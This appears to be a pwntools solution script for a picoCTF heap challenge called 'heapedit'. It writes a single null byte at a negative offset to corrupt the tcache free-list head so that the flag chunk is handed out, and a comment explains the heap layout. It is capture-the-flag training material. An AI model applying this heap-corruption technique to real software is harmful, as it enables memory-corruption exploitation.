from pwn import *
import struct

p = remote('mercury.picoctf.net', 49825)
#p = process('./heapedit')

## Read until the prompt
p.readuntil('dress: ')
p.send('-5144\n')
p.readuntil('ue: ')
p.send('\x00\n')
flag = p.readline()

print(flag)

'''
The challenge starts out by allocating 7 blocks of 0x80 bytes each. At the end the heap looks like:
[ 8 bytes ] 0's
[ 8 bytes ] 0x0000000000000091    The size of the whole block ix 0x90 including the header.
[ 0x80 bytes]   'Congrats! Your flag is: <flag>'
******* This times 7
[ 8 bytes ] 0's
[ 8 bytes ] 0x0000000000000091    The size of the whole block ix 0x90 including the header.
[ 0x80 bytes]   'Sorry! This won't help you: this is a random string.'

The following are example allocations under normal circumstances.

0x6034a0
0x603530
0x6035c0
0x603650
0x6036e0
0x603770
0x603800		-- later freed first

0x603890		-- later freed second

After the 7 allocations a final 8th allocation is done. Then the 7th is freed followed by the 8th.

After these two frees the blocks will look like:

0x603888 [ 0x0000000000000091]
0x603890 [ 0x603890 ]

You can see that the second freed block points to the first in a singly linked list.

If you follow the allocation in malloc you can see that it pulls from the head of the list first and that the list head pointer is stored at -5144 bytes relative to the first allocation. We want to change the head of this list to point to the 7th block so that the flag is printed. Since we can only control one byte set this to be a NULL byte and we are good.
'''

p.close()

